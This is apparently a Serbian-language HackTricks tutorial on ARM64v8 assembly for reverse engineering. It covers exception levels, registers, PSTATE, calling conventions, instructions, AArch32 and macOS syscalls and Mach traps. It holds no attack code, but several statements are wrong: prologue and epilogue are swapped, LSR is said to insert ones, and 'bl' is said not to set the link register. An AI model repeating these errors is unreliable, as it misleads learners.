# Uvod u ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Nivoi izuzetaka - EL (ARM64v8)**

U ARMv8 arhitekturi, nivoi izvršavanja, poznati kao nivoi izuzetaka (Exception Levels - EL), definišu nivo privilegija i mogućnosti okruženja za izvršavanje. Postoje četiri nivoa izuzetaka, od EL0 do EL3, a svaki ima drugačiju namenu:

1. **EL0 - User Mode**:
- Ovo je nivo sa najmanje privilegija i koristi se za izvršavanje regularnog application koda.
- Applications koje rade na EL0 izolovane su jedna od druge i od sistemskog software-a, čime se povećavaju bezbednost i stabilnost.
2. **EL1 - Operating System Kernel Mode**:
- Većina operating system kernela radi na ovom nivou.
- EL1 ima više privilegija od EL0 i može da pristupa sistemskim resursima, ali uz određena ograničenja radi očuvanja integriteta sistema. Iz EL0 u EL1 prelazi se pomoću `SVC` instrukcije.
3. **EL2 - Hypervisor Mode**:
- Ovaj nivo se koristi za virtualization. Hypervisor koji radi na EL2 može da upravlja sa više operating system-a (svaki u sopstvenom EL1) na istom fizičkom hardware-u.
- EL2 obezbeđuje funkcije za izolaciju i kontrolu virtualized okruženja.
- Zato virtual machine applications kao što je Parallels mogu da koriste `hypervisor.framework` za komunikaciju sa EL2 i pokretanje virtual machines bez potrebe za kernel extensions.
- Za prelazak iz EL1 u EL2 koristi se `HVC` instrukcija.
4. **EL3 - Secure Monitor Mode**:
- Ovo je nivo sa najviše privilegija i često se koristi za secure booting i trusted execution environments.
- EL3 može da upravlja i kontroliše pristup između secure i non-secure stanja (kao što su secure boot, trusted OS itd.).
- Koristio se za KPP (Kernel Patch Protection) u macOS-u, ali se više ne koristi.
- Apple više ne koristi EL3.
- Prelazak na EL3 se obično obavlja pomoću `SMC` (Secure Monitor Call) instrukcije.

Korišćenje ovih nivoa omogućava strukturisan i bezbedan način upravljanja različitim aspektima sistema, od user applications do najprivilegovanijeg system software-a. ARMv8 pristup nivoima privilegija pomaže u efikasnoj izolaciji različitih komponenti sistema, čime se poboljšavaju bezbednost i robusnost sistema.

## **Registers (ARM64v8)**

ARM64 ima **31 general-purpose register**, označenih kao `x0` do `x30`. Svaki može da čuva vrednost od **64 bita** (8 bajtova). Za operacije koje zahtevaju samo 32-bitne vrednosti, istim registerima može da se pristupi u 32-bitnom režimu pomoću imena w0 do w30.

1. **`x0`** do **`x7`** - Obično se koriste kao scratch registers i za prosleđivanje parametara subroutines.
- **`x0`** takođe sadrži return data funkcije
2. **`x8`** - U Linux kernelu, `x8` se koristi kao system call broj za `svc` instrukciju. **U macOS-u koristi se x16!**
3. **`x9`** do **`x15`** - Dodatni temporary registers, često korišćeni za local variables.
4. **`x16`** i **`x17`** - **Intra-procedural Call Registers**. Temporary registers za immediate values. Takođe se koriste za indirect function calls i PLT (Procedure Linkage Table) stubs.
- **`x16`** se koristi kao **system call broj** za **`svc`** instrukciju u **macOS-u**.
5. **`x18`** - **Platform register**. Može da se koristi kao general-purpose register, ali je na nekim platformama rezervisan za platform-specific namene: pokazivač na current thread environment block u Windows-u ili pokazivač na trenutno **izvršavajuću task structure u Linux kernelu**.
6. **`x19`** do **`x28`** - Ovo su callee-saved registers. Funkcija mora da očuva vrednosti ovih registera za svog caller-a, pa se oni čuvaju na stack-u i obnavljaju pre povratka caller-u.
7. **`x29`** - **Frame pointer** koji prati stack frame. Kada se kreira novi stack frame zbog poziva funkcije, register **`x29`** se **čuva na stack-u**, a adresa novog frame pointer-a (adresa **`sp`**) **čuva se u ovom registeru**.
- Ovaj register može da se koristi i kao **general-purpose register**, mada se obično koristi kao referenca na **local variables**.
8. **`x30`** ili **`lr`**- **Link register**. Sadrži **return address** kada se izvrši `BL` (Branch with Link) ili `BLR` (Branch with Link to Register) instrukcija, tako što se vrednost **`pc`** upisuje u ovaj register.
- Može da se koristi i kao bilo koji drugi register.
- Ako će trenutna funkcija pozvati novu funkciju i time prepisati `lr`, sačuvaće ga na stack-u na početku; to je epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Čuva `fp` i `lr`, kreira prostor i dobija novi `fp`), a zatim ga obnavlja na kraju; to je prologue (`ldp x29, x30, [sp], #48; ret` -> Obnavlja `fp` i `lr` i vraća se).
9. **`sp`** - **Stack pointer**, koristi se za praćenje vrha stack-a.
- Vrednost **`sp`** uvek mora da bude najmanje **quadword** **poravnata**, inače može doći do alignment exception-a.
10. **`pc`** - **Program counter**, koji pokazuje na sledeću instrukciju. Ovaj register može da se ažurira samo generisanjem exception-a, povratkom iz exception-a i branch instrukcijama. Jedine obične instrukcije koje mogu da čitaju ovaj register jesu branch with link instrukcije (BL, BLR), koje čuvaju adresu **`pc`** u **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. U svom **32**-bitnom obliku naziva se i **`wzr`**. Može da se koristi za jednostavno dobijanje nulte vrednosti (česta operacija) ili za poređenja pomoću **`subs`**, kao u `subs XZR, Xn, #10`, pri čemu se rezultat ne čuva nigde (u **`xzr`**).

Registeri **`Wn`** predstavljaju **32-bitnu** verziju registera **`Xn`**.

> [!TIP]
> Registeri od X0 do X18 su volatile, što znači da njihove vrednosti mogu da promene function calls i interrupts. Međutim, registeri od X19 do X28 su non-volatile, što znači da njihove vrednosti moraju da budu očuvane tokom function calls ("callee saved").

### SIMD i Floating-Point Registers

Pored toga, postoji još **32 registera dužine 128 bita** koji mogu da se koriste u optimizovanim single instruction multiple data (SIMD) operacijama i za obavljanje floating-point aritmetike. Oni se nazivaju Vn registers, mada mogu da rade i u režimima od **64**, **32**, **16** i **8** bitova, kada se nazivaju **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** i **`Bn`**.

### System Registers

**Postoje stotine system registera**, koji se takođe nazivaju special-purpose registers (SPRs), a koriste se za **monitoring** i **kontrolu** ponašanja **processors**.\
Mogu da se čitaju ili podešavaju samo pomoću posebnih instrukcija **`mrs`** i **`msr`**.

Special registers **`TPIDR_EL0`** i **`TPIDDR_EL0`** često se pronalaze tokom reverse engineering-a. Sufiks `EL0` označava **minimalni exception level** sa kojeg register može da se koristi (u ovom slučaju EL0 je regularni exception (privilege) level sa kojim rade regular programs).\
Često se koriste za čuvanje **base address-a thread-local storage** regiona memorije. Obično je prvi register čitljiv i upisiv za programs koji rade u EL0, dok drugi može da se čita iz EL0, a da se u njega upisuje iz EL1 (kao što je kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** sadrži nekoliko komponenti procesa serijalizovanih u system-visible **`SPSR_ELx`** special register, pri čemu X predstavlja **permission** **level pokrenutog** exception-a (što omogućava obnavljanje stanja procesa po završetku exception-a).\
Ovo su dostupna polja:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Condition flags **`N`**, **`Z`**, **`C`** i **`V`**:
- **`N`** znači da je operacija dala negativan rezultat
- **`Z`** znači da je operacija dala nulu
- **`C`** znači da je operacija proizvela carry
- **`V`** znači da je operacija dala signed overflow:
- Zbir dva pozitivna broja daje negativan rezultat.
- Zbir dva negativna broja daje pozitivan rezultat.
- Kod oduzimanja, kada se veliki negativan broj oduzme od manjeg pozitivnog broja (ili obrnuto), a rezultat ne može da se predstavi u opsegu datog broja bitova.
- Procesor očigledno ne zna da li je operacija signed ili unsigned, pa proverava C i V u operacijama i pokazuje da li je došlo do carry-ja u slučaju signed ili unsigned operacije.

> [!WARNING]
> Ne ažuriraju sve instrukcije ove flags. Neke, kao **`CMP`** ili **`TST`**, to rade, kao i druge koje imaju s suffix, poput **`ADDS`**.

- Flag trenutne **širine registera (`nRW`)**: Ako flag ima vrednost 0, program će po nastavku rada biti izvršen u AArch64 execution state-u.
- Trenutni **Exception Level** (**`EL`**): Regularni program koji radi u EL0 imaće vrednost 0
- Flag **`single stepping`** (**`SS`**): Debuggers ga koriste za izvršavanje instrukcija korak po korak tako što kroz exception postavljaju SS flag na 1 unutar **`SPSR_ELx`**. Program će izvršiti jedan korak i izazvati single step exception.
- Flag stanja **illegal exception** (**`IL`**): Koristi se za označavanje situacije kada privileged software izvrši nevažeći exception level transfer; ovaj flag se postavlja na 1 i procesor izaziva illegal state exception.
- **`DAIF`** flags: Ovi flagovi omogućavaju privileged programu da selektivno maskira određene external exceptions.
- Ako je **`A`** jednak 1, biće izazvani **asynchronous aborts**. **`I`** podešava reagovanje na external hardware **Interrupts Requests** (IRQs), dok je F povezan sa **Fast Interrupt Requests** (FIRs).
- Flagovi za izbor stack pointer-a (**`SPS`**): Privileged programs koji rade u EL1 i višim nivoima mogu da se prebacuju između sopstvenog stack pointer registera i user-model registera (npr. između `SP_EL1` i `EL0`). Ovo prebacivanje se obavlja upisivanjem u special register **`SPSel`**. To nije moguće iz EL0.

## **Calling Convention (ARM64v8)**

ARM64 calling convention određuje da se **prvih osam parametara** funkcije prosleđuju u registerima **`x0`** do **`x7`**. **Dodatni** parametri prosleđuju se na **stack-u**. **Return** vrednost vraća se u registeru **`x0`**, odnosno i u **`x1`** **ako je dugačka 128 bitova**. Registeri **`x19`** do **`x30`** i **`sp`** moraju da budu **očuvani** tokom function calls.

Kada čitate funkciju u assembly-ju, potražite **function prologue i epilogue**. **Prologue** obično obuhvata čuvanje frame pointer-a (`x29`), postavljanje **novog frame pointer-a** i **alociranje prostora na stack-u**. **Epilogue** obično obuhvata obnavljanje sačuvanog frame pointer-a i **povratak** iz funkcije.

### Calling Convention u Swift-u

Swift ima sopstveni **calling convention**, koji se može pronaći na [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Common Instructions (ARM64v8)**

ARM64 instrukcije uglavnom imaju **format `opcode dst, src1, src2`**, gde je **`opcode`** operacija koju treba izvršiti (kao što su `add`, `sub`, `mov` itd.), **`dst`** odredišni register u koji će se smestiti rezultat, a **`src1`** i **`src2`** izvorni registeri. Umesto izvornih registera mogu da se koriste i immediate values.

- **`mov`**: **Premešta** vrednost iz jednog **registera** u drugi.
- Primer: `mov x0, x1` — Ovo premešta vrednost iz `x1` u `x0`.
- **`ldr`**: **Učitava** vrednost iz **memorije** u **register**.
- Primer: `ldr x0, [x1]` — Ovo učitava vrednost sa memorijske lokacije na koju pokazuje `x1` u `x0`.
- **Offset mode**: Offset koji utiče na origin pointer označava se, na primer, ovako:
- `ldr x2, [x1, #8]`, ovo učitava u x2 vrednost sa x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, ovo učitava u x2 objekat iz niza x0, sa pozicije x1 (index) \* 4
- **Pre-indexed mode**: Ovo primenjuje izračunavanja na origin, dobija rezultat i čuva novi origin u origin-u.
- `ldr x2, [x1, #8]!`, ovo učitava `x1 + 8` u `x2` i čuva rezultat `x1 + 8` u x1
- `str lr, [sp, #-4]!`, čuva link register u sp i ažurira register sp
- **Post-index mode**: Ovo je slično prethodnom režimu, ali se memorijskoj adresi pristupa, a zatim se offset izračunava i čuva.
- `ldr x0, [x1], #8`, učitava `x1` u `x0` i ažurira x1 vrednošću `x1 + 8`
- **PC-relative addressing**: U ovom slučaju adresa za učitavanje izračunava se relativno u odnosu na PC register
- `ldr x1, =_start`, ovo učitava adresu na kojoj počinje simbol `_start` u x1, u odnosu na trenutni PC.
- **`str`**: **Čuva** vrednost iz **registera** u **memoriju**.
- Primer: `str x0, [x1]` — Ovo čuva vrednost iz `x0` na memorijskoj lokaciji na koju pokazuje `x1`.
- **`ldp`**: **Load Pair of Registers**. Ova instrukcija **učitava dva registera** sa **uzastopnih memorijskih** lokacija. Memorijska adresa se obično formira dodavanjem offset-a vrednosti drugog registera.
- Primer: `ldp x0, x1, [x2]` — Ovo učitava `x0` i `x1` sa memorijskih lokacija `x2` i `x2 + 8`, redom.
- **`stp`**: **Store Pair of Registers**. Ova instrukcija **čuva dva registera** na **uzastopne memorijske** lokacije. Memorijska adresa se obično formira dodavanjem offset-a vrednosti drugog registera.
- Primer: `stp x0, x1, [sp]` — Ovo čuva `x0` i `x1` na memorijskim lokacijama `sp` i `sp + 8`, redom.
- `stp x0, x1, [sp, #16]!` — Ovo čuva `x0` i `x1` na memorijskim lokacijama `sp+16` i `sp + 24`, redom, i ažurira `sp` vrednošću `sp+16`.
- **`add`**: **Sabira** vrednosti dva registera i čuva rezultat u registeru.
- Sintaksa: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Odredište
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (register ili immediate)
- \[shift #N | RRX] -> Izvršava shift ili poziva RRX
- Primer: `add x0, x1, x2` — Ovo sabira vrednosti u `x1` i `x2` i čuva rezultat u `x0`.
- `add x5, x5, #1, lsl #12` — Ovo je jednako 4096 (jedinica pomerena 12 puta) -> 1 0000 0000 0000 0000
- **`adds`** Ovo izvršava `add` i ažurira flags
- **`sub`**: **Oduzima** vrednosti dva registera i čuva rezultat u registeru.
- Pogledajte **`add`** **sintaksu**.
- Primer: `sub x0, x1, x2` — Ovo oduzima vrednost `x2` od `x1` i čuva rezultat u `x0`.
- **`subs`** Ovo je kao sub, ali ažurira flag
- **`mul`**: **Množi** vrednosti **dva registera** i čuva rezultat u registeru.
- Primer: `mul x0, x1, x2` — Ovo množi vrednosti u `x1` i `x2` i čuva rezultat u `x0`.
- **`div`**: **Deli** vrednost jednog registera drugim i čuva rezultat u registeru.
- Primer: `div x0, x1, x2` — Ovo deli vrednost u `x1` sa `x2` i čuva rezultat u `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Dodaje 0 na kraju i pomera ostale bitove napred (množenje sa n puta 2)
- **Logical shift right**: Dodaje 1 na početku i pomera ostale bitove unazad (deljenje sa n puta 2 kod unsigned vrednosti)
- **Arithmetic shift right**: Kao **`lsr`**, ali se umesto 0, ako je najznačajniji bit 1, dodaju **1** (deljenje sa n puta 2 kod signed vrednosti)
- **Rotate right**: Kao **`lsr`**, ali se sve što se ukloni sa desne strane dodaje na levu
- **Rotate Right with Extend**: Kao **`ror`**, ali sa carry flag-om kao „najznačajnijim bitom“. Carry flag se pomera na bit 31, a uklonjeni bit u carry flag.
- **`bfm`**: **Bit Field Move**, ove operacije **kopiraju bitove `0...n`** iz vrednosti i smeštaju ih na pozicije **`m..m+n`**. **`#s`** određuje poziciju **krajnjeg levog bita**, a **`#r`** količinu rotate right pomeranja.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Kopira bitfield iz jednog registera i kopira ga u drugi register.
- **`BFI X1, X2, #3, #4`** Umeće 4 bita iz X2 počevši od 3. bita u X1
- **`BFXIL X1, X2, #3, #4`** Izdvaja četiri bita iz X2 počevši od 3. bita i kopira ih u X1
- **`SBFIZ X1, X2, #3, #4`** Sign-extends 4 bita iz X2 i umeće ih u X1 počevši od pozicije bita 3, postavljajući desne bitove na nulu
- **`SBFX X1, X2, #3, #4`** Izdvaja 4 bita počevši od bita 3 iz X2, sign-extends ih i smešta rezultat u X1
- **`UBFIZ X1, X2, #3, #4`** Zero-extends 4 bita iz X2 i umeće ih u X1 počevši od pozicije bita 3, postavljajući desne bitove na nulu
- **`UBFX X1, X2, #3, #4`** Izdvaja 4 bita počevši od bita 3 iz X2 i smešta zero-extended rezultat u X1.
- **Sign Extend To X:** Proširuje znak (ili u unsigned verziji samo dodaje 0) vrednosti kako bi se sa njom mogle izvršavati operacije:
- **`SXTB X1, W2`** Proširuje znak bajta **iz W2 u X1** (`W2` je polovina od `X2`) da popuni 64 bita
- **`SXTH X1, W2`** Proširuje znak 16-bitnog broja **iz W2 u X1** da popuni 64 bita
- **`SXTW X1, W2`** Proširuje znak bajta **iz W2 u X1** da popuni 64 bita
- **`UXTB X1, W2`** Dodaje 0 (unsigned) bajtu **iz W2 u X1** da popuni 64 bita
- **`extr`:** Izdvaja bitove iz navedenog **para konkateniranih registera**.
- Primer: `EXTR W3, W2, W1, #3` Ovo će **konkatenirati W1+W2**, uzeti **od bita 3 u W2 do bita 3 u W1** i smestiti rezultat u W3.
- **`cmp`**: **Poredi** dva registera i postavlja condition flags. To je **alias za `subs`**, koji odredišni register postavlja na zero register. Korisno je za proveru da li je `m == n`.
- Podržava **istu sintaksu kao `subs`**
- Primer: `cmp x0, x1` — Ovo poredi vrednosti u `x0` i `x1` i u skladu s tim postavlja condition flags.
- **`cmn`**: **Compare negative** operand. U ovom slučaju to je **alias za `adds`** i podržava istu sintaksu. Korisno je za proveru da li je `m == -n`.
- **`ccmp`**: Conditional comparison, poređenje koje se izvršava samo ako je prethodno poređenje bilo tačno i koje posebno postavlja nzcv bitove.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> ako je x1 != x2 i x3 < x4, skače na func
- Ovo je zato što će se **`ccmp`** izvršiti samo ako je prethodni **`cmp`** bio `NE`; ako nije bio, bitovi `nzcv` biće postavljeni na 0 (što neće zadovoljiti `blt` poređenje).
- Ovo se može koristiti i kao `ccmn` (isto, ali negativno, kao razlika između `cmp` i `cmn`).
- **`tst`**: Proverava da li su neke vrednosti poređenja obe 1 (radi kao ANDS, ali bez čuvanja rezultata). Korisno je za proveru registera u odnosu na vrednost i utvrđivanje da li je neki od bitova registera označenih tom vrednošću jednak 1.
- Primer: `tst X1, #7` Proverava da li je neki od poslednja 3 bita X1 jednak 1
- **`teq`**: XOR operacija koja odbacuje rezultat
- **`b`**: Unconditional Branch
- Primer: `b myFunction`
- Imajte na umu da ovo neće popuniti link register povratnom adresom (nije pogodno za pozive subroutines koje moraju da se vrate nazad)
- **`bl`**: **Branch** with link, koristi se za **pozivanje** **subroutine**. Čuva **return address u `x30`**.
- Primer: `bl myFunction` — Ovo poziva funkciju `myFunction` i čuva return address u `x30`.
- Imajte na umu da ovo neće popuniti link register povratnom adresom (nije pogodno za pozive subroutines koje moraju da se vrate nazad)
- **`blr`**: **Branch** with Link to Register, koristi se za **pozivanje** **subroutine** čiji je target naveden u **registeru**. Čuva return address u `x30`. (Ovo je
- Primer: `blr x1` — Ovo poziva funkciju čija se adresa nalazi u `x1` i čuva return address u `x30`.
- **`ret`**: **Povratak** iz **subroutine**, obično pomoću adrese u **`x30`**.
- Primer: `ret` — Ovo vraća iz trenutne subroutine pomoću return address-a u `x30`.
- **`b.<cond>`**: Conditional branches
- **`b.eq`**: **Branch if equal**, na osnovu prethodne `cmp` instrukcije.
- Primer: `b.eq label` — Ako je prethodna `cmp` instrukcija utvrdila da su dve vrednosti jednake, skače na `label`.
- **`b.ne`**: **Branch if Not Equal**. Ova instrukcija proverava condition flags (koje je postavila prethodna comparison instrukcija) i, ako upoređene vrednosti nisu jednake, skače na label ili adresu.
- Primer: Nakon instrukcije `cmp x0, x1`, `b.ne label` — Ako vrednosti u `x0` i `x1` nisu jednake, skače na `label`.
- **`cbz`**: **Compare and Branch on Zero**. Ova instrukcija poredi register sa nulom i, ako su jednaki, skače na label ili adresu.
- Primer: `cbz x0, label` — Ako je vrednost u `x0` jednaka nuli, skače na `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Ova instrukcija poredi register sa nulom i, ako nisu jednaki, skače na label ili adresu.
- Primer: `cbnz x0, label` — Ako vrednost u `x0` nije nula, skače na `label`.
- **`tbnz`**: Test bit and branch on nonzero
- Primer: `tbnz x0, #8, label`
- **`tbz`**: Test bit and branch on zero
- Primer: `tbz x0, #8, label`
- **Conditional select operations**: Ovo su operacije čije ponašanje zavisi od conditional bits.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Ako je tačno, X0 = X1, a ako je netačno, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Ako je tačno, Xd = Xn, a ako je netačno, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Ako je tačno, Xd = Xn + 1, a ako je netačno, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Ako je tačno, Xd = Xn, a ako je netačno, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Ako je tačno, Xd = NOT(Xn), a ako je netačno, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Ako je tačno, Xd = Xn, a ako je netačno, Xd = - Xm
- `cneg Xd, Xn, cond` -> Ako je tačno, Xd = - Xn, a ako je netačno, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Ako je tačno, Xd = 1, a ako je netačno, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Ako je tačno, Xd = \<all 1>, a ako je netačno, Xd = 0
- **`adrp`**: Izračunava **page address simbola** i smešta ga u register.
- Primer: `adrp x0, symbol` — Ovo izračunava page address od `symbol` i smešta je u `x0`.
- **`ldrsw`**: **Učitava** signed **32-bitnu** vrednost iz memorije i **sign-extends je na 64** bita. Ovo se koristi za uobičajene SWITCH slučajeve.
- Primer: `ldrsw x0, [x1]` — Ovo učitava signed 32-bitnu vrednost sa memorijske lokacije na koju pokazuje `x1`, sign-extends je na 64 bita i smešta je u `x0`.
- **`stur`**: **Čuva vrednost registera na memorijskoj lokaciji**, koristeći offset od drugog registera.
- Primer: `stur x0, [x1, #4]` — Ovo čuva vrednost iz `x0` na memorijskoj adresi koja je 4 bajta veća od adrese koja se trenutno nalazi u `x1`.
- **`svc`** : Izvršava **system call**. Skraćeno od „Supervisor Call“. Kada procesor izvrši ovu instrukciju, **prebacuje se iz user mode-a u kernel mode** i skače na određenu memorijsku lokaciju na kojoj se nalazi kod za **kernel's system call handling**.

- Primer:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Čuvanje link registera i frame pointera na stack-u**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Postavljanje novog frame pointer-a**: `mov x29, sp` (postavlja novi frame pointer za trenutnu funkciju)
3. **Alociranje prostora na stack-u za lokalne promenljive** (ako je potrebno): `sub sp, sp, <size>` (gde je `<size>` broj potrebnih bajtova)

### **Epilog funkcije**

1. **Dealociranje lokalnih promenljivih** (ako su prethodno alocirane): `add sp, sp, <size>`
2. **Vraćanje link registra i frame pointer-a**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Povratak**: `ret` (vraća kontrolu pozivaocu koristeći adresu u link register-u)

## Uobičajene ARM zaštite memorije

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 stanje izvršavanja

Armv8-A podržava izvršavanje 32-bitnih programa. **AArch32** može da koristi jedan od **dva skupa instrukcija**: **`A32`** i **`T32`**, i može da prelazi između njih putem mehanizma **`interworking`**.\
**Privilegovani** 64-bitni programi mogu da zakažu **izvršavanje 32-bitnih** programa tako što izvrše transfer nivoa izuzetka na niži, privilegovani 32-bitni nivo.\
Imajte na umu da se prelazak sa 64-bitnog na 32-bitni režim dešava spuštanjem nivoa izuzetka (na primer, 64-bitni program u EL1 pokreće program u EL0). Ovo se postiže postavljanjem **bita 4 registra** **`SPSR_ELx`** na vrednost 1 kada je nit procesa **AArch32** spremna za izvršavanje, dok ostatak registra `SPSR_ELx` čuva CPSR **`AArch32`** programa. Zatim privilegovani proces poziva instrukciju **`ERET`**, čime procesor prelazi u **`AArch32`** i ulazi u A32 ili T32, u zavisnosti od CPSR-a**.**

Mehanizam **`interworking`** koristi J i T bitove CPSR-a. `J=0` i `T=0` označava **`A32`**, dok `J=0` i `T=1` označava **T32**. Ovo u osnovi znači postavljanje **najnižeg bita na 1** kako bi se označilo da je skup instrukcija T32.\
Ovo se postavlja tokom **instrukcija grananja za interworking,** ali se može postaviti i direktno drugim instrukcijama kada je PC postavljen kao odredišni registar. Primer:

Još jedan primer:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registri

Postoji 16 32-bitnih registara (r0-r15). **Od r0 do r14** mogu se koristiti za **bilo koju operaciju**, međutim, neki od njih su obično rezervisani:

- **`r15`**: Programski brojač (uvek). Sadrži adresu sledeće instrukcije. U A32 je current + 8, a u T32 current + 4.
- **`r11`**: Pokazivač okvira
- **`r12`**: Registar za intra-proceduralne pozive
- **`r13`**: Pokazivač steka (imajte na umu da je stek uvek poravnat na 16 bajtova)
- **`r14`**: Registar povratne adrese

Pored toga, registri se čuvaju u **`banked registries`**. To su mesta koja skladište vrednosti registara i omogućavaju **brzo prebacivanje konteksta** tokom obrade izuzetaka i privilegovanih operacija, kako bi se izbegla potreba za ručnim čuvanjem i vraćanjem registara svaki put.\
Ovo se vrši **čuvanjem stanja procesora iz `CPSR` u `SPSR`** režima procesora u koji se prelazi nakon izuzetka. Prilikom povratka iz izuzetka, **`CPSR`** se vraća iz **`SPSR`**.

### CPSR - Current Program Status Register

U AArch32, CPSR radi slično kao **`PSTATE`** u AArch64 i takođe se čuva u **`SPSR_ELx`** kada dođe do izuzetka, kako bi se kasnije nastavilo izvršavanje:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Polja su podeljena u nekoliko grupa:

- Application Program Status Register (APSR): Aritmetičke zastavice, dostupne iz EL0
- Execution State Registers: Ponašanje procesa (kojim upravlja OS).

#### Application Program Status Register (APSR)

- Zastavice **`N`**, **`Z`**, **`C`**, **`V`** (isto kao u AArch64)
- Zastavica **`Q`**: Postavlja se na 1 kada tokom izvršavanja specijalizovane aritmetičke instrukcije sa saturacijom dođe do **integer saturation**. Kada se jednom postavi na **`1`**, zadržava tu vrednost dok se ručno ne postavi na 0. Takođe, ne postoji instrukcija koja implicitno proverava njenu vrednost; to se mora uraditi njenim ručnim čitanjem.
- Zastavice **`GE`** (Greater than or equal): Koriste se u SIMD (Single Instruction, Multiple Data) operacijama, kao što su „parallel add“ i „parallel subtract“. Ove operacije omogućavaju obradu više tačaka podataka jednom instrukcijom.

Na primer, instrukcija **`UADD8`** **sabira četiri para bajtova** (iz dva 32-bitna operanda) paralelno i smešta rezultate u 32-bitni registar. Zatim **postavlja zastavice `GE` u `APSR`** na osnovu tih rezultata. Svaka `GE` zastavica odgovara jednom sabiranju bajtova i pokazuje da li je pri sabiranju tog para bajtova došlo do **prekoračenja**.

Instrukcija **`SEL`** koristi ove `GE` zastavice za izvršavanje uslovnih radnji.

#### Execution State Registers

- Bitovi **`J`** i **`T`**: **`J`** treba da bude 0; ako je **`T`** 0, koristi se skup instrukcija A32, a ako je 1, koristi se T32.
- **IT Block State Register** (`ITSTATE`): To su bitovi 10-15 i 25-26. Oni čuvaju uslove za instrukcije unutar grupe kojoj prethodi **`IT`**.
- Bit **`E`**: Označava **endianness**.
- **Mode and Exception Mask Bits** (0-4): Određuju trenutno stanje izvršavanja. **Peti** bit pokazuje da li program radi kao 32-bitni (1) ili 64-bitni (0). Ostala 4 bita predstavljaju **režim izuzetka koji se trenutno koristi** (kada dođe do izuzetka i on se obrađuje). Postavljena vrednost **označava trenutni prioritet** u slučaju da se tokom obrade ovog izuzetka pokrene drugi izuzetak.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Određeni izuzeci mogu biti onemogućeni pomoću bitova **`A`**, `I`, `F`. Ako je **`A`** 1, to znači da će se pokrenuti **asynchronous aborts**. **`I`** podešava odgovor na spoljne hardverske **Interrupts Requests** (IRQ). `F` se odnosi na **Fast Interrupt Requests** (FIR).

## macOS

### BSD syscalls

Pogledajte [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) ili pokrenite `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls će imati **x16 > 0**.

### Mach Traps

U [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) pogledajte `mach_trap_table`, a u [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) prototipe. Maksimalan broj Mach traps je `MACH_TRAP_TABLE_COUNT` = 128. Mach traps će imati **x16 < 0**, tako da brojeve iz prethodne liste treba pozivati sa **minusom**: **`_kernelrpc_mach_vm_allocate_trap`** je **`-10`**.

Takođe možete proveriti **`libsystem_kernel.dylib`** u disassembleru da biste pronašli kako se pozivaju ovi (i BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Napomena: **Ida** i **Ghidra** takođe mogu da dekompajliraju **specific dylibs** iz cache-a jednostavnim prosleđivanjem cache-a.

> [!TIP]
> Ponekad je lakše proveriti **dekompajlirani** kod iz **`libsystem_kernel.dylib`** **nego** proveravati **source code**, zato što se kod nekoliko syscall-ova (BSD i Mach) generiše pomoću skripti (pogledajte komentare u source code-u), dok u dylib-u možete pronaći šta se poziva.

### machdep calls

XNU podržava još jedan tip poziva koji se nazivaju machine dependent. Brojevi ovih poziva zavise od architecture, a ni sami pozivi ni njihovi brojevi nisu garantovano konstantni.

### comm page

Ovo je memorijska stranica u vlasništvu kernel-a koja je mapirana u address space svakog users procesa. Namenjena je tome da prelazak iz user mode-a u kernel space bude brži nego pri korišćenju syscall-ova za kernel servise koji se toliko često koriste da bi ovaj prelazak bio veoma neefikasan.

